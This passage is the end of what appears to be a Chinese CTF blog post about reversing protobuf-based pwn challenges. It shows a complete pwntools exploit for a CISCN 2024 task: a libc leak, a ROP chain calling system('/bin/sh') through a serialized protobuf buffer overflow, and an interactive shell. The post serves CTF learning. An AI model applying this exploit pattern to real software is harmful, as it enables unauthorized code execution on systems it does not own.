+</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">terminal</span> <span class="o">=</span> <span class="p">[</span><span class="s2">&#34;tmux&#34;</span><span class="p">,</span> <span class="s2">&#34;splitw&#34;</span><span class="p">,</span> <span class="s2">&#34;-h&#34;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="p">(</span><span class="n">os</span><span class="o">=</span><span class="s1">&#39;linux&#39;</span><span class="p">,</span><span class="n">arch</span><span class="o">=</span><span class="s1">&#39;amd64&#39;</span><span class="p">,</span><span class="n">log_level</span><span class="o">=</span><span class="s1">&#39;debug&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">dbg</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="n">gdb</span><span class="o">.</span><span class="n">attach</span><span class="p">(</span><span class="n">p</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="c1"># pause()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">address</span> <span class="o">=</span> <span class="s1">&#39;./pwn&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="n">address</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="n">address</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">libc</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">libc</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># ip = &#34;&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># port = </span>
+</span></span><span class="line"><span class="cl"><span class="c1">#p = remote(ip,port)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># leak libc</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;Gift: &#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">gift</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">14</span><span class="p">),</span> <span class="mi">16</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">libc_base</span> <span class="o">=</span> <span class="n">gift</span> <span class="o">-</span> <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;puts&#39;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">libc_base</span>
+</span></span><span class="line"><span class="cl"><span class="n">success</span><span class="p">(</span><span class="s2">&#34;libc_base = &#34;</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">libc_base</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># rop</span>
+</span></span><span class="line"><span class="cl"><span class="n">system</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;system&#39;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="n">binsh</span> <span class="o">=</span> <span class="nb">next</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;/bin/sh</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl"><span class="n">ret</span> <span class="o">=</span> <span class="nb">next</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="n">asm</span><span class="p">(</span><span class="s1">&#39;ret&#39;</span><span class="p">),</span> <span class="n">executable</span><span class="o">=</span><span class="kc">True</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl"><span class="n">pop_rdi</span> <span class="o">=</span> <span class="nb">next</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="n">asm</span><span class="p">(</span><span class="s1">&#39;pop rdi; ret&#39;</span><span class="p">),</span> <span class="n">executable</span><span class="o">=</span><span class="kc">True</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl"><span class="n">pop_rsi</span> <span class="o">=</span> <span class="nb">next</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="n">asm</span><span class="p">(</span><span class="s1">&#39;pop rsi; ret&#39;</span><span class="p">),</span> <span class="n">executable</span><span class="o">=</span><span class="kc">True</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl"><span class="n">pop_rdx_r12</span> <span class="o">=</span> <span class="nb">next</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="n">asm</span><span class="p">(</span><span class="s1">&#39;pop rdx; pop r12; ret&#39;</span><span class="p">),</span> <span class="n">executable</span><span class="o">=</span><span class="kc">True</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">pl</span><span class="o">=</span><span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mh">0x218</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">binsh</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">ret</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">system</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">message</span> <span class="o">=</span> <span class="n">message_pb2</span><span class="o">.</span><span class="n">protoMessage</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="n">message</span><span class="o">.</span><span class="n">buffer</span> <span class="o">=</span> <span class="n">pl</span>
+</span></span><span class="line"><span class="cl"><span class="n">message</span><span class="o">.</span><span class="n">size</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">pl</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">pl</span> <span class="o">=</span> <span class="n">message</span><span class="o">.</span><span class="n">SerializeToString</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">pl</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span></span></span></code></pre></td></tr></table></div><div class="code-expand-btn" aria-label="Expand or collapse code block" role="button"><i class="fa-solid fa-angles-down" aria-hidden="true"></i></div>
+</div>
+</div><h3 class="heading-element" id="参考文章"><span>参考文章</span>
+  <a href="#%e5%8f%82%e8%80%83%e6%96%87%e7%ab%a0" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p><a href="https://xz.aliyun.com/news/15171" target="_blank" rel="external nofollow noopener noreferrer">https://xz.aliyun.com/news/15171</a></p></div><div class="post-footer" id="post-footer">
+  <div class="post-info">
+    <div class="post-info-line">
+      <div class="post-info-mod"><span title="Updated on 2026-02-02 12:24:10">Updated on 2026-02-02&nbsp;</span>
+      </div><div class="post-info-license">
+            <span><a rel="license external nofollow noopener noreferrer" href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a></span>
+          </div></div><div class="post-info-line">
+        <div class="post-info-md"><span><a href="/posts/protobuf/index.md" title="Read Markdown" class="link-to-markdown">Read Markdown</a></span><span><a href="vscode://file/D:%5cBlog%5ccontent%5cposts%5cprotobuf.md" title="Open in editor" target="_blank" rel="external nofollow noopener noreferrer" class="link-to-vscode">Open in editor</a></span></div>
+        <div class="post-info-share">
+          <span></span>
+        </div>
+      </div></div>
+
+  <div class="post-info-more">
+    <section class="post-tags"></section>
+    <section><span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+    </section>
+  </div><div class="post-nav"><a href="/posts/kernel_ebpfpwn/" class="post-nav-item" rel="prev" title="内核ebpfpwn（未完成版）"><i class="fa-solid fa-angle-left fa-fw" aria-hidden="true"></i>内核ebpfpwn（未完成版）</a><a href="/posts/mqtt/" class="post-nav-item" rel="next" title="Mqtt协议pwn">Mqtt协议pwn<i class="fa-solid fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
+</div>
+</article>
+
+  <aside class="toc" id="toc-auto" aria-label="Contents"><h2 class="toc-title">Contents&nbsp;<i class="toc-icon fa-solid fa-angle-down fa-fw" aria-hidden="true"></i></h2>
+      <div class="toc-content" id="toc-content-auto"></div></aside><dialog id="toc-dialog" aria-labelledby="toc-dialog-title" role="dialog">
+      <div class="toc">
+        <h2 class="toc-title">Contents</h2>
+        <div class="toc-content" id="toc-content-drawer"><nav >
+  <ul>
+    <li>
+      <ul>
+        <li><a href="#安装使用">安装使用</a></li>
+        <li><a href="#基础知识">基础知识</a></li>
+        <li><a href="#工具逆向">工具逆向</a></li>
+        <li><a href="#手动逆向">手动逆向</a>
+          <ul>
+            <li><a href="#message">message</a></li>
+            <li><a href="#成员">成员</a></li>
+            <li><a href="#字段描述符">字段描述符</a>
+              <ul>
+                <li><a href="#id"><strong>id</strong></a></li>
+                <li><a href="#label"><strong>label</strong></a></li>
+                <li><a href="#type"><strong>type</strong></a></li>
+              </ul>
+            </li>
+            <li><a href="#版本">版本</a></li>
+            <li><a href="#偏移问题">偏移问题</a></li>
+          </ul>
+        </li>
+        <li><a href="#脚本">脚本</a></li>
+        <li><a href="#例题">例题</a>
+          <ul>
+            <li><a href="#ciscn-2024-华中赛区半决赛">CISCN 2024 华中赛区半决赛</a></li>
+          </ul>
+        </li>
+        <li><a href="#参考文章">参考文章</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav></div>
+      </div>
+    </dialog></main><footer class="footer">
+    <div class="footer-container"><div class="footer-line powered">Powered by <a href="https://gohugo.io/" target="_blank" rel="external nofollow noopener noreferrer" title="Hugo 0.154.3"><img class="hugo-icon" src="/images/hugo.min.svg" alt="Hugo logo" /> Hugo</a> | Theme - <a href="https://github.com/hugo-fixit/FixIt" target="_blank" rel="external" title="FixIt v0.4.2-20260109063229-50d27e0e"><img class="fixit-icon" src="/images/fixit.min.svg" alt="FixIt logo" /> FixIt</a>
+        </div><div class="footer-line copyright" itemscope itemtype="http://schema.org/CreativeWork"><i class="fa-regular fa-copyright fa-fw" aria-hidden="true"></i>
+            <span itemprop="copyrightYear">2026</span><span class="author" itemprop="copyrightHolder">
+              <a href="/"> </a></span></div></div>
+  </footer></div><div class="widgets"><div class="fixed-buttons"><div class="fixed-button back-to-top animate__faster d-none" role="button" aria-label="Back to Top"><i class="fa-solid fa-arrow-up fa-fw" aria-hidden="true"></i><svg viewBox="0 0 100 100">
+              <circle class="bg" cx="50" cy="50" r="50"></circle>
+              <circle class="progress" cx="50" cy="50" r="50"></circle>
+            </svg></div><div id="toc-drawer-button" class="fixed-button toc-drawer-button d-none" role="button" aria-label="Contents"><i class="fa-solid fa-bars fa-fw" aria-hidden="true"></i></div></div><div id="mask"></div><div class="reading-progress-bar" style="left: 0;top: 0;"></div><noscript>
+    <div class="noscript-warning">This website works best with JavaScript enabled.</div>
+  </noscript>
+</div><script src="/lib/autocomplete/autocomplete.min.js" defer></script><script src="/lib/fuse/fuse.min.js" defer></script><script src="/lib/typeit/index.umd.js" defer></script><script src="/js/config/136291e5ea9b534fa5f67de0b44cd42a.js" defer></script><script src="/js/theme.min.js" defer></script></body>
+</html>
